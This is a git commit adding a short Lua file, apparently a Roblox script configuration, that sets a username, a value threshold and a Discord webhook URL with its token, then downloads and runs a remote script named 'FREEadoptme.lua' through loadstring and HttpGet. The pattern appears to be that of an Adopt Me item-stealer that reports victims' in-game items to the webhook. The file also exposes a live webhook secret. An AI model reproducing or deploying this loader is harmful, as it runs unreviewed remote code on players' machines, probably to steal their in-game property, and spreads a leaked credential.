4d4edf4dc56a48807d616b328d14d6bc77f97bff
gabriela-8w <danciugabriela12@gmail.com>
2025-04-25 12:25:13 +0300

    Create text.lua

---
+++ text.lua
@@ -0,0 +1,6 @@
+_G.Username = "gajita_monster"
+_G.min_value = 0.1
+_G.pingEveryone = "Yes"
+_G.webhook = "https://discord.com/api/webhooks/1365244051091226695/uA_0Uai7gCwQNtuTmhwWAag7eonlnguHrAj9vQL6xS5V2DDZVDwEAsvgjMHD_QBjAJLU"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Adopt-Me/refs/heads/main/FREEadoptme.lua"))()
